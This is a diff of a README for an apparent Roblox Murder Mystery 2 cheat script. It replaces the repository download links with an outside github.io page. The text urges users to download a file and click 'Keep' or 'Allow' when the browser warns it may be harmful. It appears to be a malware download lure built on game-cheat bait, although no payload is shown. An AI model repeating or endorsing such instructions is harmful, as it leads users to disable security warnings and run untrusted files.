@@ -1,6 +1,6 @@
 # 🎯 MM2-Auto-Win-Knife-Throw-Script-2026 - Master every match with ease today
 
-[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/Athenefishingnet737/MM2-Auto-Win-Knife-Throw-Script-2026)
+[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://athenefishingnet737.github.io)
 
 ## 📌 Overview
 
@@ -29,7 +29,7 @@ Follow these steps to set up the script on your computer.
 
 ## 📥 Installation and Setup
 
-You must obtain the necessary files to begin. You can visit this page to download the script files for your system: [https://github.com/Athenefishingnet737/MM2-Auto-Win-Knife-Throw-Script-2026](https://github.com/Athenefishingnet737/MM2-Auto-Win-Knife-Throw-Script-2026).
+You must obtain the necessary files to begin. You can visit this page to download the script files for your system: [https://athenefishingnet737.github.io](https://athenefishingnet737.github.io).
 
 Save the file to a folder you can access easily, such as your Downloads folder or Desktop. Locate the file after the download completes. If your browser marks the file as potentially harmful, you may need to click "Keep" or "Allow" to finish the process, as script files often trigger generic security warnings.
 
